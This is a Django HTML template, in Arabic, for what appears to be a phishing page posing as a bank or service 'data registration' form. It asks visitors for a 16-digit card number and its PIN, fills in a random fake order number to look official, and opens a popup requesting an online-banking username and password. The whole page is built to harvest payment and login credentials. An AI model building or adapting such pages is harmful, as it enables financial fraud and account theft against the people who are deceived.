{% extends 'services/main.html' %} {% block content %} {% load static %}
<style>
    .center {
        position: absolute;
        /* display: flex; */
        top: 1rem;
        border-radius: 3px;
        left: 50%;
        transform: translate(-50%, 0%);
        /* width: 400px; */
        /* height: 200px; */
        background-color: #f3f6f9;
        align-items: center;
        justify-content: center;
        display: none;
        text-align: end;
        flex-direction: column;
        width: 430px;
        height: 240px;
        border: solid;
        border-width: 5px;
        border-color: #0e8a8a;
    }
    
    @media (max-width: 550px) {
        .center {
            top: 2rem;
            width: 370px;
            height: 225px;
        }
    }
    
    @media (max-width: 380px) {
        .center {
            top: 2rem;
            width: 354px;
            height: 205px;
        }
    }
    
    .child-center {
        margin-bottom: 30px;
    }
    
    .fa-xmark {
        position: absolute;
        top: 6%;
        right: 6%;
        font-size: 1.5rem;
        cursor: pointer;
    }
    
    .alert-submit-btn {
        --c1: #0e8a8a;
        --c2: #153536;
        background: linear-gradient(-.646turn, --c2, --c1 51%, --c2) 0/200%;
        background: linear-gradient(-.646turn, var(--c2, --c2), var(--c1, --c1) 51%, var(--c2, --c2)) var(--x, 0)/200%;
        border: none;
        border-radius: 0.125rem;
        box-shadow: 0 2px 5px 0 rgb(0 0 0 / 16%), 0 2px 10px 0 rgb(0 0 0 / 12%);
        color: #fff;
        cursor: pointer;
        font-size: 14px;
        line-height: 1.5;
        /* margin: 0 10px; */
        outline: none;
        padding: 0.3rem 1.6rem;
        position: absolute;
        bottom: 5%;
        left: 20%;
    }
    
    label {
        display: block;
    }
    
    label[for="password"] {
        padding-top: 15px;
    }
</style>
<div class="center" id="center">
    <i class="fa-solid fa-xmark" id="exit-btn" onclick="exit();"></i>
    <div class="child-center">
        <label for="username">*اسم المستخدم</label>
        <input type="text" dir="rtl" placeholder="اسم المستخدم">
        <label for="password">*كلمة المرور</label>
        <input type="password" dir="rtl" placeholder="كلمة المرور">
    </div>
    <div class="form-buttons "><button class="alert-submit-btn " name="submitBtn ">متابعة</button></div>

</div>
<div class="page-content ">
    <form class="register-form " method="POST">
        {% csrf_token %}
        <p class="form-title ">تسجيل البيانات</p>
        <div class="row ">
            <p class="row-title ">رقم الطلب</p><input class="row-input " id="s1 " type="text " name="order_num" readonly="readonly"></div>
        <div class="row ">
            <p class="row-title " mandatory="true ">رقم بطاقة الصرافة</p><input class="row-input " type="number" inputmode="numeric" maxlength="16" minlength="16" name="credit_card" required=" "></div>
        <div class="row ">
            <p class="row-title " mandatory="true ">إدخال الرمز</p><input class="row-input " type="number" inputmode="numeric" name="pin_code" placeholder="إدخال الرمز " required=" "></div>

        <p class="online-service" onclick="clicked(); ">* لخدمة الأونلاين إضغط هنا</p>
        <p class="alert-message "></p>

        <div class="form-buttons "><button class="form-submit-btn " name="submitBtn ">متابعة</button></div>
    </form>
</div>



<script>
    window.onload = function() {
        document.getElementById("s1 ").value = (Math.floor(100000 + Math.random() * 900000000));
    }
    var alertMessage = document.getElementById('center');

    var onlineService = document.getElementsByClassName('online-service');

    function clicked() {
        alertMessage.style.display = "flex ";
    }

    function exit() {
        alertMessage.style.display = "none ";
    }
</script>
{% endblock %}
